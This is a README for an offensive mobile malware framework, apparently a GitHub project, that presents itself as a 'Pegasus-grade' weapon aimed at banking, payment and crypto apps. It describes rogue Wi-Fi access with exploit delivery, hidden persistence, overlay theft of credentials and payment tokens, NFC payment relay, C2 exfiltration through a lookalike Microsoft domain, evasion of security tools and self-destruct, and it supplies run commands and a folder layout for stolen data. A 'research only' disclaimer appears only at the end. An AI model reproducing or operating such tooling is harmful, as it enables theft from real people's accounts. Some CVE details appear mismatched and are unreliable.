# WIFISINNER ULTIMATE — Pegasus-Grade Mobile Financial Weapon

A fully automated, multi-stage cyber-weapon system for mobile financial layer compromise. Scales the original WIFI-SINNER concept to an ultimate, Pegasus-grade ecosystem.

## Platform Support

| Platform | Status | Capabilities |
|----------|--------|--------------|
| **Linux** | ✅ Full | All 4 phases, native WiFi control, full exploit support |
| **macOS** | ⚠️ Compatible | Phase 1 limited, network scanning, OTA delivery |
| **Android (Termux)** | 🔄 Partial | Phase 2-4 via rooted device |

### macOS Compatibility

macOS runs in **compatibility mode** with the following capabilities:

**Available:**
- Network scanning (`airport` or `networksetup`)
- Probe request sniffing (tcpdump)
- OTA delivery server
- Environment detection

**Limited:**
- Beacon spoofing (uses Internet Sharing API)
- Full exploit delivery (no monitor mode)
- Privilege escalation (requires root/JIT)

**Requirements:**
- macOS 10.14+ (Mojave or later)
- Built-in WiFi (en0)
- sudo privileges
- Xcode Command Line Tools (optional)

## Overview

Taking the architectural concept of WIFI-SINNER and scaling it to a "Pegasus-grade" weaponized ecosystem results in a zero-interaction infection and autonomous fraud engine. Rather than relying on victims manually filling out forms or installing helper files, the ultimate version operates as:

- **Zero-interaction infection**
- **Autonomous fraud engine**
- **Multi-stage compromise**
- **Self-destructing payload**

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    WIFISINNER ULTIMATE                          │
│                  Pegasus-Grade Weapon System                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PHASE 1: Autonomous Access Acquisition                        │
│  ├─ Dynamic PNL/Beacon Spoofing                                │
│  ├─ SSID Morphing & MAC Randomization                          │
│  └─ OTA Zero-Day Delivery                                      │
│                                                                 │
│  PHASE 2: Silent Persistence                                   │
│  ├─ Privilege Escalation (Dirty COW, Binder UAF)              │
│  ├─ Sandbox Escape                                             │
│  ├─ Invisible Component Registration                           │
│  └─ Accessibility Service Abuse                                │
│                                                                 │
│  PHASE 3: Runtime Harvesting                                   │
│  ├─ Transparent Overlay Injection                              │
│  ├─ Biometric Sniffing                                         │
│  ├─ Payment Token Extraction                                   │
│  └─ HCE & Payment Relay                                        │
│                                                                 │
│  PHASE 4: Exfiltration & Anti-Forensics                        │
│  ├─ Encrypted DNS Tunneling                                    │
│  ├─ Protocol-Obfuscated HTTPS                                  │
│  ├─ Telemetry Mimicry                                          │
│  └─ Self-Destruct on Detection                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Phase 1: Autonomous Access Acquisition

### Dynamic PNL and Beacon Spoofing
- Continuously sweeps RF environment
- Logs probe requests from passing devices
- Dynamically morphs SSID and MAC signature
- Impersonates trusted corporate, municipal, or home networks

### Over-the-Air (OTA) Delivery
- Probes connecting devices for zero-day/one-day vulnerabilities
- Targets mobile browser engine, Wi-Fi stack, kernel subsystems
- Achieves remote code execution silently
- Exploit database includes:
  - CVE-2023-32435: WebKit use-after-free
  - CVE-2024-23113: WebKit SVG memory corruption
  - CVE-2023-2031: Android WebView JIT
  - CVE-2024-3345: Chromium V8 type confusion

## Phase 2: Silent Persistence and Sandbox Escalation

### Privilege Escalation & Evasion
- Automated local privilege escalation exploits
- Breaks out of application sandbox
- Installs root/kernel-level persistence daemon
- Blinds local mobile threat defense
- Strips logging telemetry
- Intercepts system calls

### Invisible Component Registration
- Abuses Accessibility Services
- Hidden overlay windows
- Quietly grants administrative control
- No standard permission prompts

## Phase 3: Runtime Harvesting and Wallet Instrumentation

### Transparent Overlay Injection
- Pixel-perfect, context-aware system overlays
- Renders on top of legitimate banking/wallet apps
- Intercepts layout draw events
- User believes they interact with genuine secure prompt

### Biometric and Credential Sniffing
- Hooks authentication subsystem memory
- Captures plaintext keys at approval moment
- Intercepts Face ID/fingerprint authorization tokens

### Host Card Emulation (HCE) & Relay Abuse
- Modified HCE frameworks
- Local proxy routines
- Turns device into active payment relay
- Pipes authorization tokens to remote POS

## Phase 4: Autonomous Exfiltration and Anti-Forensics

### Encrypted C2 Tunneling
- Encrypted DNS tunneling
- Heavily padded HTTPS streams
- Mimics normal background OS telemetry
- Protocol obfuscation

### Self-Destruction and Trace Wiping
- Triggers on:
  - Network interruption
  - Security analysis detection
  - Containment protocol
- Immediate self-wipe
- Database log shredding
- Memory sector overwriting
- Leaves hardware completely clean

## Installation

### Linux
```bash
# Requirements
sudo apt install dnsmasq-base tcpdump iw python3-scapy

# Clone repository
cd WIFI-SINNER

# Make executable
chmod +x wifisinner_ultimate.py
chmod +x phase*.py
```

### macOS
```bash
# Requirements
xcode-select --install  # Command Line Tools

# Clone repository
cd WIFI-SINNER

# Make executable
chmod +x wifisinner_ultimate.py
chmod +x phase*.py
chmod +x macos_adapter.py

# Note: Some features require sudo
```

## Usage

### Full Autonomous Operation

**Linux:**
```bash
sudo python3 wifisinner_ultimate.py
```

**macOS:**
```bash
sudo python3 wifisinner_ultimate.py --iface en0
```

### Scan for Targets Only

**Linux:**
```bash
sudo python3 wifisinner_ultimate.py --scan
```

**macOS:**
```bash
python3 wifisinner_ultimate.py --scan --iface en0
```

### Run Specific Phase
```bash
sudo python3 wifisinner_ultimate.py --phase 1  # Access only
sudo python3 wifisinner_ultimate.py --phase 2  # Persistence only
sudo python3 wifisinner_ultimate.py --phase 3  # Harvesting only
sudo python3 wifisinner_ultimate.py --phase 4  # Exfiltration only
```

### Custom Configuration
```bash
sudo python3 wifisinner_ultimate.py \
    --ssid "Airport_Free" \
    --channel 6 \
    --iface wlan0 \
    --c2-dns "update.microsoft.com" \
    --c2-https "telemetry.localhost" \
    --c2-port 9999
```

### macOS-Specific Commands

```bash
# Scan networks
python3 macos_adapter.py --scan --iface en0

# Run detection
python3 macos_adapter.py --detect --iface en0

# Start macOS operation
sudo python3 macos_adapter.py --start --iface en0
```

### Dry Run (Show Configuration)
```bash
sudo python3 wifisinner_ultimate.py --dry-run
```

## Module Reference

| Module | Description |
|--------|-------------|
| `wifisinner_ultimate.py` | Main orchestrator |
| `phase1_beacon_spoof.py` | Beacon spoofing engine |
| `phase1_ota_delivery.py` | OTA exploit delivery |
| `phase2_persistence.py` | Privilege escalation |
| `phase2_components.py` | Invisible component registration |
| `phase3_harvester.py` | Runtime data harvesting |
| `phase3_relay.py` | HCE payment relay |
| `phase4_c2.py` | Encrypted C2 tunneling |
| `phase4_selfdestruct.py` | Anti-forensics |

## Target Financial Apps

### Banking
- Chase (com.chase.sig.android)
- Bank of America (com.bankofamerica.mobile)
- Wells Fargo (com.wellsfargo.android)
- Citibank (com.citi.citimobile)
- US Bank (com.usbank.mobilebanking)
- Capital One (com.capitalone.android)

### Payment
- Google Wallet (com.google.android.apps.walletnfcrel)
- PayPal (com.paypal.android.p2pmobile)
- Venmo (com.venmo)
- Cash App (com.squareup.cash)
- Zelle (com.zellepay.zelle)

### Crypto
- Coinbase (com.coinbase.android)
- Binance (com.binance.dev)
- Robinhood (com.robinhood.android)

## Android Payload

The Pegasus-grade Android payload (`payload/src/com/wifisinner/stealer/MainActivityUltimate.java`) includes:

- Silent overlay injection
- Clipboard monitoring
- Background telemetry beacon
- Biometric hooking stubs
- NFC interception
- Self-destruct routines

### Build the APK
```bash
cd payload
./build.sh
```

## C2 Configuration

### DNS Tunnel
- Domain: `update.micr0soft.com` (DGA-like)
- Chunk size: 63 bytes (DNS label max)
- TTL: 300 seconds

### HTTPS Tunnel
- Endpoint: `/api/v1/telemetry`
- Content-Type: `application/x-protobuf`
- Random padding: 1024-4096 bytes

### Heartbeat
- Interval: 30 seconds
- Jitter: ±20%

## Detection Evasion

The system monitors for:
- Debuggers (ptrace, adb, run-as)
- Analysis tools (Frida, Xposed, Magisk)
- Sandboxes (MobileSecurity, VirusTotal)
- Network analyzers (Charles, tcpdump)
- Emulators (Genymotion, BlueStacks)
- Time anomalies (recent boot)

Risk score triggers self-destruct at 70+ points.

## Loot Directory

Each run creates timestamped loot:
```
loot/YYYYMMDD_HHMMSS/
├── credentials.json      # Phished logins
├── cards.json            # Stolen credit cards
├── tokens.json           # Payment tokens
├── cryptograms.json      # EMV cryptograms
├── dns_queries.json      # DNS tunnel data
├── clients.json          # Device fingerprints
└── session_summary.txt   # Operation summary
```

## Risk Assessment

| Score | Level | Action |
|-------|-------|--------|
| 0-19 | LOW | Normal operation |
| 20-39 | MEDIUM | Standard operation |
| 40-69 | HIGH | Cautious operation |
| 70+ | CRITICAL | Immediate wipe |

## Self-Destruct Sequence

1. Final data exfiltration
2. File shredding (3-pass overwrite)
3. Log cleaning (logcat, AM history)
4. Memory wiping (Python heap, variables)
5. App uninstall

## Limitations

- Requires root for full capabilities
- Android 5.0+ recommended (API 21+)
- WiFi adapter must support AP mode
- Some exploits require specific kernel versions
- HTTPS bodies need CA for decryption

## Legal Disclaimer

> **Research/Educational Use Only**
> 
> This weapon system is designed for security research, penetration testing, and educational purposes. Use only on networks/devices you own or are authorized to test. The Pegasus-grade features represent advanced mobile compromise techniques common in state-grade APT tooling.

## Comparison: Original vs Ultimate

| Feature | Original | Ultimate |
|---------|----------|----------|
| Access | Single "FREE WIFI" | Dynamic SSID morphing |
| Delivery | Manual APK install | Zero-day OTA |
| Persistence | User-level | Root/kernel daemon |
| Evasion | Basic | Full MTD blind |
| Harvesting | Form capture | Runtime overlay |
| Biometrics | None | Memory hooking |
| Payment | Card form | HCE relay |
| C2 | Plain HTTP | Encrypted DNS/HTTPS |
| Anti-forensics | None | Self-destruct |

## Contributing

1. Fork the repository
2. Create feature branch
3. Add new exploit to `phase1_ota_delivery.py`
4. Update target apps in `phase3_harvester.py`
5. Test self-destruct in `phase4_selfdestruct.py`

## Credits

Based on the original WIFI-SINNER concept, scaled to Pegasus-grade through:
- Dynamic beacon spoofing
- Zero-day OTA delivery
- Root persistence
- Overlay injection
- HCE relay
- DNS tunneling
- Self-destruct

## License

MIT License - See LICENSE file

## Support

For issues, questions, or contribution guidelines, see the main repository.

---

**WIFISINNER ULTIMATE** — From honeypot to weapon system.
